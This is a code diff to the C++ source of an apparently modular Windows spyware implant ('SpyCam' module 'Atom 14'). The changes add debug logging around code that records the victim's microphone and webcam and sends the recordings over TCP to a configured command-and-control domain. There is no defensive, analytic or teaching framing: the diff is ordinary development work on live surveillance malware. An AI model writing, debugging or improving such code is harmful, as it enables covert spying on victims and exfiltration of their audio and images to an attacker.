@@ -204,7 +204,12 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
     if (!hCmdPipe) { SpyDebug("[Atom 14] FATAL: Command pipe failed."); return 1; }
 
     HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
-    if (!hReportPipe) { CloseHandle(hCmdPipe); return 1; }
+    if (!hReportPipe) { 
+        SpyDebug("[Atom 14] FATAL: Report pipe failed. Error: %lu", GetLastError());
+        CloseHandle(hCmdPipe); 
+        return 1; 
+    }
+    SpyDebug("[Atom 14] IPC pipes connected successfully.");
 
     BYTE SharedSessionKey[16];
     memcpy(SharedSessionKey, Config::PSK_ID, 16);
@@ -263,18 +268,26 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
                                         sin.sin_port = htons(Config::PUBLIC_PORT); 
                                         sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                         
+                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Mic...", Config::C2_DOMAIN, Config::PUBLIC_PORT);
                                         if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                             char header[128];
                                             sprintf_s(header, "[SPY_MIC] size=%zu", wavData.size());
                                             send(sock, header, (int)strlen(header) + 1, 0);
                                             send(sock, (const char*)wavData.data(), (int)wavData.size(), 0);
                                             SpyDebug("[Atom 14] Mic data sent via Turbo TCP.");
+                                        } else {
+                                            SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                         }
+                                    } else {
+                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", Config::C2_DOMAIN);
                                     }
                                     closesocket(sock);
+                                } else {
+                                    SpyDebug("[Atom 14] WSASocketA FAILED. Error: %d", WSAGetLastError());
                                 }
                             }
                         } else {
+                            SpyDebug("[Atom 14] RecordMicrophone FAILED.");
                             char err[] = "[SPY_MIC] Recording failed (no microphone?).";
                             IPC_MESSAGE errMsg = {0};
                             errMsg.dwSignature = 0x534D4952;
@@ -321,18 +334,26 @@ DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
                                         sin.sin_port = htons(Config::PUBLIC_PORT); 
                                         sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                         
+                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Cam...", Config::C2_DOMAIN, Config::PUBLIC_PORT);
                                         if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                             char header[128];
                                             sprintf_s(header, "[SPY_CAM] size=%zu", bmpData.size());
                                             send(sock, header, (int)strlen(header) + 1, 0);
                                             send(sock, (const char*)bmpData.data(), (int)bmpData.size(), 0);
                                             SpyDebug("[Atom 14] Cam data sent via Turbo TCP.");
+                                        } else {
+                                            SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                         }
+                                    } else {
+                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", Config::C2_DOMAIN);
                                     }
                                     closesocket(sock);
+                                } else {
+                                    SpyDebug("[Atom 14] WSASocketA FAILED. Error: %d", WSAGetLastError());
                                 }
                             }
                         } else {
+                            SpyDebug("[Atom 14] CaptureWebcamFrame FAILED.");
                             char err[] = "[SPY_CAM] Capture failed (no webcam?).";
                             IPC_MESSAGE errMsg = {0};
                             errMsg.dwSignature = 0x534D4952;
